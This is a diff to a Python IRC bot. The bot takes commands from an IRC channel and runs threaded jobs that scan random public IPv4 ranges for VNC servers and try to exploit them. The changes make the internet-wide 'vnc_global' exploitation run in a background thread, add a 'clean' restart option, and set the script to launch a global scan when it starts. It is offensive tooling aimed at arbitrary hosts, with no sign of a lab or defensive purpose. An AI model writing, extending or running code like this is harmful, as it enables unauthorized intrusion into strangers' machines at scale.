@@ -58,7 +58,6 @@ class Bot:
 		else:
 			argstr, text = line, ''
 		args = argstr.split(' ')
-		print(args)
 
 		if args[0] == self.END_OF_MOTD:
 			for channel in self.__channels:
@@ -101,7 +100,8 @@ class Bot:
 			self.vnc_newb_expl_div(args[0])
 			self.printayne('5 jobs now exploiting the mask {0}'.format(args[0]), self.__channels)
 		if (cmd == 'vnc_global'):
-			t = Thread(target=self.vnc_global)
+			t = Thread(target=self.vnc_global, args=(args[0] == 'clean',))
+			t.start()
 			self.add_jobs('vnc', [t])
 			self.printayne('global vnc scan initialized', self.__channels)
 		if (cmd == 'jobs'):
@@ -136,7 +136,7 @@ class Bot:
 				if newb_expl(host):
 					self.printayne('vnc vulnerable => {0}'.format(host), self.__channels)
 
-	def vnc_newb_expl_div(self, mask):
+	def vnc_newb_expl_div(self, mask, join=False):
 		threads = []
 		for i in range(5):
 			b = i * 51
@@ -145,19 +145,22 @@ class Bot:
 		
 		[t.start() for t in threads]
 		self.add_jobs('vnc', threads)
-		return threads
+		if join:
+			[t.join() for t in threads]
 
-	def vnc_global(self):
-		vncd_f = open('vnc_done.json', 'r')
-		vncd_j = json.load(vncd_f)
-		vncd_f.close()
-		mask_done = vncd_j['masks']
+	def vnc_global(self, clean):
+		mask_done = []
+		if not clean:
+			vncd_f = open('vnc_done.json', 'r')
+			vncd_j = json.load(vncd_f)
+			vncd_f.close()
+			mask_done = vncd_j['masks']
 		r_first, r_second, mask = self.random_mask()
 		while True:
+			#subnetworks in 192.168.x.x or between 172.16 and 172.31 are private so no need for scanning
 			while mask in mask_done or r_first == 10 or mask == '192.168' or (r_first == 172 and r_second >= 16 and r_second <= 31):
 				r_first, r_second, mask = self.random_mask()
-			jobs = self.vnc_newb_expl_div(mask)
-			[j.join() for j in jobs]
+			self.vnc_newb_expl_div(mask, True)
 			vncd_f = open('vnc_done.json', 'w')
 			mask_done.append(mask)
 			j = {'masks': mask_done}
@@ -177,12 +180,11 @@ class Bot:
 					self.parse(clean)
 
 if __name__ == '__main__':
+	"""
 	bot = Bot('woodoozera')
 	bot.add_connection('irc.freenode.org', 6667)
 	bot.set_channels(['#woodoo'])
 	bot.connect()
-
-	"""testing parse
-	bot = Bot('aasdjqrr')
-	bot.parse('PING HRuiashdiuah jaoisuhras', 1)
 	"""
+	bot = Bot('woodoozera')
+	bot.vnc_global(True)
